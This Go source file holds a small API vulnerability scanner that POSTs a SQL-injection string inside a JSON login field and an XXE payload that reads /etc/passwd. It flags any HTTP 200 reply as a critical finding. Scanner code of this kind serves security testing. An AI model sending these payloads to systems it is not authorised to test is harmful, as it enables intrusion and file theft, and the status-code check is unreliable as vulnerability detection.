package main

import (
    "fmt"
    "net/http"
    "strings"
)

func apiVulnerabilityScan(url string) {
    fmt.Printf("Scanning API for vulnerabilities: %s\n", url)

    // JSON Injection Payload
    jsonPayload := `{"username":"admin","password":"\" OR 1=1 --"}`
    resp, err := http.Post(url, "application/json", strings.NewReader(jsonPayload))
    if err != nil {
        fmt.Println("Error scanning JSON API:", err)
        return
    }
    if resp.StatusCode == 200 {
        fmt.Println("[CRITICAL] JSON Injection vulnerability detected!")
    }

    // XML External Entity (XXE) Payload
    xxePayload := `<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`
    resp, err = http.Post(url, "application/xml", strings.NewReader(xxePayload))
    if err != nil {
        fmt.Println("Error scanning XML API:", err)
        return
    }
    if resp.StatusCode == 200 {
        fmt.Println("[CRITICAL] XML External Entity (XXE) vulnerability detected!")
    }
}

